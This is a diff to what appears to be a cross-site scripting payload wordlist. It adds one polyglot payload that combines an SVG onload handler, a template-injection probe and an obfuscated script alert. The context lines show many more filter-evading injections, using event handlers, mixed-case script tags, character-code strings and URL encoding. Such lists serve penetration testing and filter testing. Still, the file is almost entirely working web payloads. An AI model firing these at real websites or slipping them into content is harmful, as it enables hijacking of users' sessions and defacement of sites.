@@ -1,3 +1,4 @@
+
  <font style='color:expression(alert('XSS'))'>
 -->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
 -->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
@@ -26,6 +27,7 @@
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88, 83, 83, 32, 98, 121, 32, 72, 82))//";alert(String.fromCharCode(88, 83, 83, 32, 98, 121, 32, 72, 82))//\";alert(String.fromCharCode(88, 83, 83, 32, 98, 121, 32, 72, 82))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88, 83, 83, 32, 98, 121, 32, 72, 82))</SCRIPT>
 ';alert(test); //
 '';!--"<XSS>=&{()}
+'"--><svg/onload=top[30]()>${{4*9}}<script>+alert?.``</script>
 '); alert('XSS
 ')alert('xss');
 '%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
